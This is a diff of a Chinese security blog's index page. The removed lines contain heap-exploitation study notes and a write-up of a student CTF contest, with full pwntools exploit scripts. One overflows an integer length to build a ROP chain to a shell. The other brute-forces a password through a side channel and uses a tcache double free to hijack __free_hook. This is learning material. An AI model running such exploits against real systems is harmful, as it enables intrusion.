@@ -86,127 +86,19 @@
     <div>
       <h2 class="title"><a href="/2021/11/28/%E5%A0%86%E5%AD%A6%E4%B9%A0%E6%95%B4%E7%90%86%EF%BC%88%E4%B8%80%EF%BC%89/">堆学习整理（一）</a></h2>
       <span class="lx-post-detail"><i class="fa fa-calendar-o"></i> 2021-11-28</span>
-      <p><p>学习堆的过程中，我根据<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/environment/">ctf-wiki</a>上关于堆的内容中重点做了一些简单整理</p>
-<h2 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h2><p>chunksize和2*size_sz对齐（64位下位16）</p>
-<p>如果malloc大小不对齐，大于8向上取整，小于等于8向下取整</p>
-<h2 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h2><ol>
-<li>单链表</li>
-<li><strong>fd指针指向先进入bin的chunk，使用LIFO策略</strong></li>
-<li>free时不会合并，即使与未分配区域相邻也不会合并</li>
-<li>不清空prev_inuse</li>
-<li>大小为整数0x20~0x80共7个</li>
-<li>glibc 要求 chunk 块至少可以存储 4 个必要的字段。例如malloc(size),size&lt;16,自动分配对齐0x20。</li>
-<li>常用的0x7f对应的大小为0x70的fastbin（即分配0x60）</li>
-<li>仅检测fastbin头部是否存在doublefree</li>
-</ol>
-<h2 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h2><ol>
-<li><p>双链表</p>
-</li>
-<li><p>大小不符合fastbin</p>
-</li>
-<li><p>第一个进入的chunk，其fd,bk指向main_arean固定偏移处，后续<strong>bk指向后进入的chunk，fd指向先进入的chunk</strong>，与main_arean构成循环双向链表</p>
-</li>
-<li><p>free时会触发unlink，合并物理地址相邻的chunk</p>
-</li>
-<li><p>使用方式：Unsorted Bin 在使用的过程中，采用的遍历顺序是 <strong>FIFO</strong>，<strong>即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取</strong>。</p>
-<p>在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中。</p>
-</li>
-</ol>
-<h2 id="Tcache"><a href="#Tcache" class="headerlink" title="Tcache"></a>Tcache</h2><ol>
-<li><p>一次 malloc 时，会先 malloc 一块内存用来存放 <code>tcache_perthread_struct</code> 。</p>
-</li>
-<li><p>free 内存，且 size 小于 small bin size 时</p>
-<p>tcache 出现之前会放到 fastbin 或者 unsorted bin 中</p>
-<p>tcache 出现后：</p>
-<ul>
-<li>先放到对应的 tcache 中，直到 tcache 被填满（默认是 7 个）</li>
-<li>tcache 被填满之后，再次 free 的内存和之前一样被放到 fastbin 或者 unsorted bin 中</li>
-<li>tcache 中的 chunk 不会合并（不取消 inuse bit）</li>
-<li><strong>LIFO</strong></li>
-</ul>
-</li>
-<li><p>malloc 内存，且 size 在 tcache 范围内</p>
-</li>
-<li><p>先从 tcache 取 chunk，直到 tcache 为空、</p>
-</li>
-<li><p>tcache 为空后，从 bin 中找</p>
-</li>
-<li><p>tcache 为空时，如果 <code>fastbin/smallbin/unsorted bin</code> 中有 size 符合的 chunk，会先把 <code>fastbin/smallbin/unsorted bin</code> 中的 chunk 放到 tcache 中，直到填满。之后再从 tcache 中取；因此 chunk 在 bin 中和 tcache 中的顺序会反过来</p>
-</li>
-</ol>
-<h2 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h2><ol>
-<li>要求：需要获取存储chunk地址的数组地址</li>
-<li>堆内容：可以控制chunk[a]中的内容，布置fd,bk分别为&amp;chunk[a]-0x18,&amp;chunk[a]-0x10,并堆溢出改写其相邻的fakechunk的prevsize和prev_inuse(和size在同一字节)。</li>
-<li>其中的chunksize检查除了可以伪造size等于fakechunk中prev_size，因为prev_size只用于找到上一个chunk的开始地址，所以也可以在chunk[a]里再伪造一个相邻chunk，使其prev_size=伪造的chunksize。限于glibc&lt;=2.28</li>
-<li>效果：可以更改数组中，fakechunk前一个存储chunk[a]地址为&amp;chunk[a]-0x18</li>
-<li>用处：改写got表，一是改写free为system，二是改写atoi为system</li>
-</ol>
-<h2 id="Fastbin-Attack"><a href="#Fastbin-Attack" class="headerlink" title="Fastbin Attack"></a>Fastbin Attack</h2><h3 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h3><ol>
-<li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li>
-<li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li>
-<li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</li>
-<li>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code> 。</li>
-<li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li>
-</ol>
-<p>查看free中的fastbin相关的处理源码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">if ((unsigned long)(size) &lt;= (unsigned long)(get_max_fast ())</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">  ## 对size进行基本的检查</span><br><span class="line">    if (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= 2 * SIZE_SZ, 0)</span><br><span class="line">  || __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">           &gt;= av-&gt;system_mem, 0))</span><br><span class="line">      &#123;</span><br><span class="line">  ...</span><br><span class="line">  ## 对next chunk的size进行检查</span><br><span class="line">  if (chunk_at_offset (p, size)-&gt;size &lt;= 2 * SIZE_SZ</span><br><span class="line">        || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">        &#125;))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = &quot;free(): invalid next size (fast)&quot;;</span><br><span class="line">      goto errout;</span><br><span class="line">    &#125;</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
-
-<p>可以看到只需要满足前后两个chunksize的相关条件就能正常进fastbin</p>
-<p>free后再次malloc对应size即可获得fakechunk地址处的一个chunk</p>
-<p>fastbin attack的基本用法是获取一个已知地址的chunk然后修改内容</p>
-<p>此外还有关于global_max_fat的用法，需要结合unsortedbin attack</p>
-<p>基本思想就是利用fastbin的单链表和字节错位的方式从已知地址上分配一个chunk出来改写</p>
-<h2 id="Unsorted-Bin-attack"><a href="#Unsorted-Bin-attack" class="headerlink" title="Unsorted Bin attack"></a>Unsorted Bin attack</h2><p>修改chunk的bk为&amp;target-0x10,fd为任意值都不影响</p>
-<p>通过malloc出这个chunk实现任意地址写，但之后可能会导致无法使用unsortedbin</p>
-<p>修改后的值为unsorted_chunks(av)，是一个很大的不确定的数字</p>
-<p>一种用法是把循环、条件的值改成一个很大的数，没什么可说的</p>
-<p>还有就是修改 heap 中的 global_max_fast 来使得更大的 chunk 可以被视为 fast bin，这样我们就可以去执行一些 fast bin attack 了。</p>
-<ol>
-<li><p>改写 <code>global_max_fast</code> 为一个较大的值，然后释放一个较大的堆块时，由于fastbins数组空间是有限的，其相对偏移将会往后覆盖，如果释放堆块的size可控，就可实现往fastbins数组（main_arena）后的任意地址写入所堆块的地址。</p>
-<p>实现任意地址写的方式是：通过地址与fastbin数组的偏移计算出所需 <code>free</code> 的堆块的size，然后释放相应的堆块，即可实现往该地址写入堆块的地址以进一步利用。</p>
-<p>计算偏移的代码可以如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fastbin_ptr=libc_base+libc.symbols[&#x27;main_arena&#x27;]+8</span><br><span class="line">idx=(target_addr-fastbin_ptr)/8</span><br><span class="line">size=idx*0x10+0x20</span><br></pre></td></tr></table></figure>
-
-<p>或者仍然使用fastbin attack，只是少了global_max_fast的限制</p>
-</li>
-</ol>
-</p>
+      <p><div class="note info">
+            <p>学习堆的过程中，我根据<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/environment/">ctf-wiki</a>上关于堆的内容中重点做了一些简单整理</p><p>这篇文章主要总结了关于fastbin、unsorted bin和tcache的部分内容</p>
+          </div></p>
       <div class="post-button"><a class="btn" href="/2021/11/28/%E5%A0%86%E5%AD%A6%E4%B9%A0%E6%95%B4%E7%90%86%EF%BC%88%E4%B8%80%EF%BC%89/" rel="noopener"><i class="fa fa-angle-double-right fa-fw"></i>Read More</a></div>
     </div>
   </div>
   <div class="lx-entry padding">
     <div>
-      <h2 class="title"><a href="/2021/11/28/%E8%AE%B02021%E6%96%B0%E7%94%9F%E8%B5%9B-%E5%88%9D%E8%AF%86%E4%BE%A7%E4%BF%A1%E9%81%93sidechannel/">记2021新生赛-初识侧信道sidechannel</a></h2>
+      <h2 class="title"><a href="/2021/11/28/%E8%AE%B02021%E6%96%B0%E7%94%9F%E8%B5%9B-%E5%88%9D%E8%AF%86%E4%BE%A7%E4%BF%A1%E9%81%93sidechannel/">记2021新生赛-初识侧信道SideChannel</a></h2>
       <span class="lx-post-detail"><i class="fa fa-calendar-o"></i> 2021-11-28</span>
-      <p><p>感谢jkilopu师傅出的题，这次新生赛虽然是给新生做的，我也学到了不少东西。最后的侧信道确实没想到，但赛后看，还是思路不够开阔，没找对方法。</p>
-<p>题目地址及exp：<a target="_blank" rel="noopener" href="https://github.com/jkilopu/scuctf_newbee_2021_pwn">https://github.com/jkilopu/scuctf_newbee_2021_pwn</a></p>
-<h2 id="pwn8-safe-copy"><a href="#pwn8-safe-copy" class="headerlink" title="pwn8 safe_copy"></a>pwn8 safe_copy</h2><p>这题主要问题是找到哪里可以溢出</p>
-<p><img src="/2021/11/28/%E8%AE%B02021%E6%96%B0%E7%94%9F%E8%B5%9B-%E5%88%9D%E8%AF%86%E4%BE%A7%E4%BF%A1%E9%81%93sidechannel/pwn8.png" alt="pwn8"></p>
-<p>这里看到一个整数向上溢出，让maxlen=0xffffffff,接下来就可以为所欲为地溢出了</p>
-<p>下面的过程除了因为这个栈比较大，看得有点麻烦以外，只需要慢慢找栈上的地址，算出libc和pie基址，接一个system就行</p>
-<p>完整exp：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">#p=process(&#x27;./safe_copy&#x27;)</span><br><span class="line">p=remote(&#x27;game.scuctf.com&#x27;,20005)</span><br><span class="line">libc=ELF(&#x27;./libc-2.23.so&#x27;)</span><br><span class="line"></span><br><span class="line">def copy(payload,start,maxlen,boun,copylen):</span><br><span class="line">	p.sendafter(&#x27;Your input: &#x27;,payload)</span><br><span class="line">	p.sendlineafter(&#x27;Start offset: &#x27;,str(start))</span><br><span class="line">	p.sendlineafter(&#x27;Max copy len: &#x27;,str(maxlen))</span><br><span class="line">	p.sendlineafter(&#x27;Copy boundary: &#x27;,str(boun))</span><br><span class="line">	p.sendlineafter(&#x27;Copy len: &#x27;,str(copylen))</span><br><span class="line"></span><br><span class="line">def ex():</span><br><span class="line">	p.sendafter(&#x27;Your input: &#x27;,&#x27;exit\n&#x27;+&#x27;\x00&#x27;*4)</span><br><span class="line">	p.sendlineafter(&#x27;Start offset: &#x27;,&#x27;1&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;Max copy len: &#x27;,&#x27;1&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;Copy boundary: &#x27;,&#x27;3&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;Copy len: &#x27;,&#x27;1&#x27;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(p,&#x27;b *$rebase(0x1350)&#x27;)</span><br><span class="line"></span><br><span class="line">payload=&#x27;a&#x27;*8</span><br><span class="line">copy(payload,0x10,0x7fffffff,0x100,0x10)</span><br><span class="line">p.recvuntil(&#x27;aaaaaaaa&#x27;)</span><br><span class="line">libc.address=u64(p.recv(6).ljust(8,&#x27;\x00&#x27;))-0x18c727</span><br><span class="line">print hex(libc.address)</span><br><span class="line"></span><br><span class="line">system = libc.symbols[&#x27;system&#x27;]</span><br><span class="line">bin_sh = next(libc.search(&#x27;/bin/sh\x00&#x27;))</span><br><span class="line"></span><br><span class="line">payload=&#x27;a&#x27;*0x10</span><br><span class="line">copy(payload,0x100,0x7fffffff,0x100,0x9)</span><br><span class="line">p.recvuntil(&#x27;aaaaaaaaa&#x27;)</span><br><span class="line">canary=u64(&#x27;\x00&#x27;+p.recv(7))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#gdb.attach(p,&#x27;b *$rebase(0x1350)&#x27;)</span><br><span class="line">payload=&#x27;a&#x27;*0x11</span><br><span class="line">copy(payload,0x100,0x7fffffff,0x100,0x11)</span><br><span class="line">p.recvuntil(&#x27;a&#x27;*0x11)</span><br><span class="line">pie=&#x27;\x00&#x27;+p.recv(5)</span><br><span class="line">pie=u64(pie.ljust(8,&#x27;\x00&#x27;))-0x1700</span><br><span class="line">pop_rdi=pie+0x1763</span><br><span class="line">print hex(pie)</span><br><span class="line"></span><br><span class="line">payload=&#x27;a&#x27;*8+p64(canary)+&#x27;a&#x27;*0x28+p64(pop_rdi)+p64(bin_sh)+p64(system)</span><br><span class="line">copy(payload,0x100,0x7fffffff,0x100,0x50)</span><br><span class="line"></span><br><span class="line">ex()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="pwn9-login-侧信道side-channel"><a href="#pwn9-login-侧信道side-channel" class="headerlink" title="pwn9 login     侧信道side channel"></a>pwn9 login     侧信道side channel</h2><p>这道题比赛时间里没做出来，甚至没能找到第一个正确位数的leak，还是看jkilopu师傅赛后的答案才狠狠学习了。</p>
-<p>首先需要爆破出root的随机密码，拿到一个uaf</p>
-<p>这里用到了side channel，也就是通过获取非直接信息来爆破出内容</p>
-<p>看到checkpassword的功能中有</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v7 = v2;</span><br><span class="line">__printf_chk(1LL, &quot;Wrong password: %s\n&quot;, pwd);</span><br><span class="line">v4 = v7;</span><br></pre></td></tr></table></figure>
-
-<p>注意到v7和输出pwd地址相邻，通过填充0x98个字符，可以泄露当前匹配正确密码位数</p>
-<p>利用这个机制可以爆破出chunk中长度为存储的len的内容</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">def sc_login(index,size,mini,maxi):</span><br><span class="line">    password = &#x27;&#x27;</span><br><span class="line">    for right_len in range(size):</span><br><span class="line">        if right_len !=len(password):</span><br><span class="line">          print(&quot;false length&quot;)</span><br><span class="line">          break</span><br><span class="line">        for guess_byte in range(mini,maxi+1):</span><br><span class="line">            if guess_byte != ord(&#x27;\n&#x27;):</span><br><span class="line">                if right_len != size-1:            </span><br><span class="line">                    guess_string=password+p8(guess_byte)</span><br><span class="line">                    guess_string=guess_string.ljust(0x98,&#x27;a&#x27;)</span><br><span class="line">                    login(index,guess_string)</span><br><span class="line">                    p.recvuntil(&#x27;Wrong password: &#x27;)</span><br><span class="line">                    p.recv(0x98)</span><br><span class="line">                    temp_correct=u8(p.recv(1))</span><br><span class="line"></span><br><span class="line">                    if temp_correct==ord(&#x27;\n&#x27;) and right_len==0:</span><br><span class="line">                        temp_correct=0</span><br><span class="line">                        </span><br><span class="line">                    if temp_correct &gt;= right_len+1:</span><br><span class="line">                        password += p8(guess_byte)</span><br><span class="line">                        log.success(&quot;length:&quot;+str(len(password))+&quot; password:&quot;+str(password))</span><br><span class="line">                        break</span><br><span class="line">                else:                                                #在最后一位login成功</span><br><span class="line">                    login(index,password+p8(guess_byte)+&#x27;\n&#x27;)</span><br><span class="line">                    if p.recvuntil(&#x27;\n&#x27;, drop=True) == b&quot;Login success!&quot;:     #学到了recvuntil新用法</span><br><span class="line">                        password += p8(guess_byte)</span><br><span class="line">                        break</span><br><span class="line">    log.success(&quot;password for user &quot; + str(index) + &quot; = &quot; + str(password))</span><br><span class="line">    return password</span><br></pre></td></tr></table></figure>
-
-<p>因为tcache的存在，先要填充7个chunk，然后利用刚刚的得到的uaf，通过unsortedbin leak，同样是爆破出chunk的内容，注意使用uaf的chunk存储的len大小一定要是6，如果小于6会导致进程终止。还是大小调到刚好给自己省点事吧。</p>
-<p>简单算出unsortedBin中地址与基址偏移</p>
-<p><img src="/2021/11/28/%E8%AE%B02021%E6%96%B0%E7%94%9F%E8%B5%9B-%E5%88%9D%E8%AF%86%E4%BE%A7%E4%BF%A1%E9%81%93sidechannel/pwn9.png" alt="pwn9"></p>
-<p>有了基址和uaf，接下来只要使用tcache double free劫持__free_hook,注意要先清空之前放入tcache的7个chunk</p>
-<p>完整exp：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import*</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">p=process(&#x27;./login&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc_login.so&#x27;)</span><br><span class="line">#p=remote(&#x27;game.scuctf.com&#x27;,20000)</span><br><span class="line"></span><br><span class="line">def login(index,password):</span><br><span class="line">	p.sendlineafter(&#x27;&gt;&gt; &#x27;,&#x27;2&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;Input user index: &#x27;,str(index))</span><br><span class="line">	p.sendafter(&#x27;Input password: &#x27;,password)</span><br><span class="line"></span><br><span class="line">def add(index,uid,password):</span><br><span class="line">	p.sendlineafter(&#x27;&gt;&gt; &#x27;,&#x27;1&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;Input user index: &#x27;,str(index))</span><br><span class="line">	p.sendlineafter(&#x27;id: &#x27;,str(uid))</span><br><span class="line">	p.sendlineafter(&#x27;len: &#x27;,str(len(password)))</span><br><span class="line">	p.sendafter(&#x27;password: &#x27;,password)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">	p.sendlineafter(&#x27;&gt;&gt; &#x27;,&#x27;3&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;Input user index: &#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def root_del(index):</span><br><span class="line">    p.sendlineafter(&#x27;Input victim index: &#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def sc_login(index,size,mini,maxi):</span><br><span class="line">    password = &#x27;&#x27;</span><br><span class="line">    for right_len in range(size):</span><br><span class="line">        if right_len !=len(password):</span><br><span class="line">          print(&quot;false length&quot;)</span><br><span class="line">          break</span><br><span class="line">        for guess_byte in range(mini,maxi+1):</span><br><span class="line">            if guess_byte != ord(&#x27;\n&#x27;):</span><br><span class="line">                if right_len != size-1:            </span><br><span class="line">                    guess_string=password+p8(guess_byte)</span><br><span class="line">                    guess_string=guess_string.ljust(0x98,&#x27;a&#x27;)</span><br><span class="line">                    login(index,guess_string)</span><br><span class="line">                    p.recvuntil(&#x27;Wrong password: &#x27;)</span><br><span class="line">                    p.recv(0x98)</span><br><span class="line">                    temp_correct=u8(p.recv(1))</span><br><span class="line"></span><br><span class="line">                    if temp_correct==ord(&#x27;\n&#x27;) and right_len==0:</span><br><span class="line">                        temp_correct=0</span><br><span class="line">                        </span><br><span class="line">                    if temp_correct &gt;= right_len+1:</span><br><span class="line">                        password += p8(guess_byte)</span><br><span class="line">                        log.success(&quot;length:&quot;+str(len(password))+&quot; password:&quot;+str(password))</span><br><span class="line">                        break</span><br><span class="line">                else:                                                #在最后一位login成功</span><br><span class="line">                    login(index,password+p8(guess_byte)+&#x27;\n&#x27;)</span><br><span class="line">                    if p.recvuntil(&#x27;\n&#x27;, drop=True) == b&quot;Login success!&quot;:     #学到了recvuntil新用法</span><br><span class="line">                        password += p8(guess_byte)</span><br><span class="line">                        break</span><br><span class="line">    log.success(&quot;password for user &quot; + str(index) + &quot; = &quot; + str(password))</span><br><span class="line">    return password</span><br><span class="line"></span><br><span class="line">for i in range(1,9):</span><br><span class="line">    add(i,i,str(i)*6)   #必须是6，因为密码检查功能依赖chunk中存储的len，libc地址位数为6</span><br><span class="line">for i in range(7):</span><br><span class="line">    delete(8-i)</span><br><span class="line"></span><br><span class="line">sc_login(0,0x30,48,48+78)</span><br><span class="line">root_del(1)</span><br><span class="line">#gdb.attach(p,&#x27;b *$rebase(0x16eb)&#x27;)</span><br><span class="line"></span><br><span class="line">libc.address= u64(sc_login(1, 6, 0x1, 0xff).ljust(8, &#x27;\x00&#x27;))-0x3ebca0</span><br><span class="line"></span><br><span class="line">for i in range(2,9):</span><br><span class="line">    add(i,i,str(i)*4)</span><br><span class="line">add(9,9,&#x27;aaaa&#x27;)</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">delete(9)</span><br><span class="line"></span><br><span class="line">add(11, 11, p64(libc.symbols[&quot;__free_hook&quot;]))</span><br><span class="line">add(12, 12, &quot;/bin/sh&quot;)</span><br><span class="line">add(13, 13, p64(libc.symbols[&quot;system&quot;]))</span><br><span class="line"></span><br><span class="line">delete(12)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-</p>
+      <p><div class="note info">
+            <p>感谢jkilopu师傅出的题，这次新生赛虽然是给新生做的，我也学到了不少东西。最后的侧信道确实没想到，但赛后看，还是思路不够开阔，没找对方法。</p><p>题目地址及exp：<a target="_blank" rel="noopener" href="https://github.com/jkilopu/scuctf_newbee_2021_pwn">https://github.com/jkilopu/scuctf_newbee_2021_pwn</a></p>
+          </div></p>
       <div class="post-button"><a class="btn" href="/2021/11/28/%E8%AE%B02021%E6%96%B0%E7%94%9F%E8%B5%9B-%E5%88%9D%E8%AF%86%E4%BE%A7%E4%BF%A1%E9%81%93sidechannel/" rel="noopener"><i class="fa fa-angle-double-right fa-fw"></i>Read More</a></div>
     </div>
   </div>
@@ -250,7 +142,13 @@
     <li><a href="/"><i class="fa fa-home fa-fw"></i>Home</a></li>
     <li><a href="/archives/"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
     
-    
+    <li class="has-sub"><span class="dropdown-heading">
+      <i class="fa fa-bookmark fa-fw"></i>Pages</span>
+        <ul>
+          <li><a href="/guestbook/">Guestbook</a></li>
+        <li><a href="/about/">About</a></li>
+        </ul>
+    </li>
     <li class="has-sub"><span class="dropdown-heading">
       <i class="fa fa-link fa-fw"></i>Friends</span>
         <ul>
